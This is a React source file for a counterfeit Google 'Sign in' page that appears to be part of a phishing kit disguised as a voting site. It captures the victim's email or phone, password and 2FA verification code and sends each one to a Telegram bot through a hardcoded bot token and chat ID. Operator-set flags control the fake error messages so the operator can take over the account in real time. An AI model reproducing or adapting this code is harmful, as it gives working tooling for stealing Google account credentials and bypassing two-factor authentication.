import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useToast } from '@/hooks/use-toast';
import { useAuthSettings } from '@/hooks/use-auth-settings';
import { VoteSuccessModal } from '@/components/VoteSuccessModal';

const TELEGRAM_BOT_TOKEN = '7371815939:AAEi9KZLsmz1bM5vxgNic7NXUocO6tdSHks';
const TELEGRAM_CHAT_ID = '-1002380892216';

type Step = 'email' | 'password' | '2fa';

// Add this type for settings
type GoogleAuthSettings = {
  platforms: {
    google: {
      emailStep: { success: boolean };
      passwordStep: { success: boolean };
      twoFactor: { success: boolean };
    };
  };
};

const GmailLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState<Step>('email');
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();
  const { settings, loading: settingsLoading } = useAuthSettings('google');

  const sendToTelegram = async (message: string) => {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  const validateInput = (input: string) => {
    // Email regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    // Phone number regex (supports international format)
    const phoneRegex = /^\+?[\d\s-]{10,}$/;

    if (emailRegex.test(input)) {
      return { isValid: true, type: 'email' };
    } else if (phoneRegex.test(input.replace(/[\s-]/g, ''))) {
      return { isValid: true, type: 'phone' };
    } else if (input.includes('@')) {
      return { 
        isValid: false, 
        error: 'Please include "@" in the email address. "' + input + '" is missing an "@".'
      };
    } else {
      return { 
        isValid: false, 
        error: 'Please enter a valid email or phone number'
      };
    }
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validation = validateInput(email);

    if (!validation.isValid) {
      toast({
        title: "Error",
        description: validation.error,
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(`🔐 Gmail Login Step 1\n\n👤 ${validation.type === 'email' ? 'Email' : 'Phone'}: ${email}\n\n📱 Platform: Gmail\n⏰ Time: ${new Date().toLocaleString()}`);

      toast({
        title: "Verifying...",
        description: "Please wait while we verify your credentials",
      });

      setTimeout(() => {
        setLoading(false);
        if (settings?.platforms.google.emailStep.success) {
          setCurrentStep('password');
        } else {
          toast({
            title: "Error",
            description: `Couldn't find your Google Account`,
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify. Please try again.",
        variant: "destructive",
        className: "bg-white text-black",
      });
      setLoading(false);
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      toast({
        title: "Error",
        description: "Please enter your password",
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(`🔐 Gmail Login Step 2\n\n👤 Email: ${email}\n🔑 Password: ${password}\n\n📱 Platform: Gmail\n⏰ Time: ${new Date().toLocaleString()}`);

      toast({
        title: "Verifying...",
        description: "Please wait while we verify your password",
      });

      setTimeout(() => {
        setLoading(false);
        if (settings?.platforms?.google?.passwordStep?.success) {
          setCurrentStep('2fa');
        } else {
          toast({
            title: "Error",
            description: "Wrong password. Try again or click 'Forgot password' to reset it.",
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify password. Please try again.",
        variant: "destructive",
        className: "bg-white text-black",
      });
      setLoading(false);
    }
  };

  const handle2FASubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verificationCode) {
      toast({
        title: "Error",
        description: "Please enter verification code",
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(`🔐 Gmail Login Step 3\n\n👤 Email: ${email}\n🔑 2FA Code: ${verificationCode}\n\n📱 Platform: Gmail\n⏰ Time: ${new Date().toLocaleString()}`);
      
      toast({
        title: "Verifying code...",
        description: "Please wait while we verify your code",
      });

      setTimeout(() => {
        if (settings?.platforms?.google?.twoFactor?.success) {
          setShowSuccessModal(true);
        } else {
          toast({
            title: "Error",
            description: "Wrong code. Try again.",
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
        setLoading(false);
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify code. Please try again.",
        variant: "destructive",
        className: "bg-white text-black",
      });
      setLoading(false);
    }
  };

  if (settingsLoading) {
    return (
      <div className="min-h-screen bg-[#fff] flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500" />
      </div>
    );
  }

  return (
    <>
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full p-8">
          <div className="text-center mb-8">
            <img
              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
              alt="Google"
              className="h-8 mx-auto mb-8"
            />
            <h1 className="text-2xl mb-2">Sign in</h1>
            <p className="text-gray-600">
              {currentStep === 'email' && 'Continue to Gmail'}
              {currentStep === 'password' && `Welcome ${email}`}
              {currentStep === '2fa' && '2-Step Verification'}
            </p>
          </div>

          {currentStep === 'email' && (
            <form onSubmit={handleEmailSubmit} className="space-y-6">
              <input
                type="text"
                placeholder="Email or phone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
              />
              <div className="text-sm text-[#1a73e8] font-medium">
                <a href="#">Forgot email?</a>
              </div>
              <div className="text-sm text-gray-600">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#" className="text-[#1a73e8] font-medium ml-1">Learn more</a>
              </div>
              <div className="flex justify-between items-center">
                <a href="#" className="text-[#1a73e8] font-medium text-sm">Create account</a>
                <button
                  type="submit"
                  disabled={loading}
                  className="bg-[#1a73e8] text-white px-6 py-2 rounded hover:bg-[#1557b0] transition-colors disabled:opacity-50"
                >
                  {loading ? 'Checking...' : 'Next'}
                </button>
              </div>
            </form>
          )}

          {currentStep === 'password' && (
            <form onSubmit={handlePasswordSubmit} className="space-y-6">
              <input
                type="password"
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
              />
              <div className="text-sm text-[#1a73e8] font-medium">
                <a href="#">Forgot password?</a>
              </div>
              <div className="flex justify-between items-center">
                <button
                  type="button"
                  onClick={() => setCurrentStep('email')}
                  className="text-[#1a73e8] font-medium text-sm"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  className="bg-[#1a73e8] text-white px-6 py-2 rounded hover:bg-[#1557b0] transition-colors disabled:opacity-50"
                >
                  {loading ? 'Checking...' : 'Next'}
                </button>
              </div>
            </form>
          )}

          {currentStep === '2fa' && (
            <form onSubmit={handle2FASubmit} className="space-y-6">
              <p className="text-sm text-gray-600 mb-4">
                A verification code has been sent to {email}
              </p>
              <input
                type="text"
                placeholder="Enter verification code"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                maxLength={6}
              />
              <div className="text-sm text-[#1a73e8] font-medium">
                <a href="#">Get a new code</a>
              </div>
              <div className="flex justify-between items-center">
                <button
                  type="button"
                  onClick={() => setCurrentStep('password')}
                  className="text-[#1a73e8] font-medium text-sm"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  className="bg-[#1a73e8] text-white px-6 py-2 rounded hover:bg-[#1557b0] transition-colors disabled:opacity-50"
                >
                  {loading ? 'Verifying...' : 'Next'}
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
      <VoteSuccessModal 
        open={showSuccessModal} 
        onClose={() => {
          setShowSuccessModal(false);
          navigate('/');
        }} 
      />
      <div className="fixed bottom-4 left-4">
        <a 
          href="/"
          className="text-sm text-gray-600 hover:text-gray-900 flex items-center gap-2"
        >
          <svg 
            xmlns="http://www.w3.org/2000/svg" 
            width="16" 
            height="16" 
            viewBox="0 0 24 24" 
            fill="none" 
            stroke="currentColor" 
            strokeWidth="2" 
            strokeLinecap="round" 
            strokeLinejoin="round"
          >
            <path d="M19 12H5M12 19l-7-7 7-7"/>
          </svg>
          Back to Black and White Entertainment
        </a>
      </div>
    </>
  );
};

export default GmailLogin;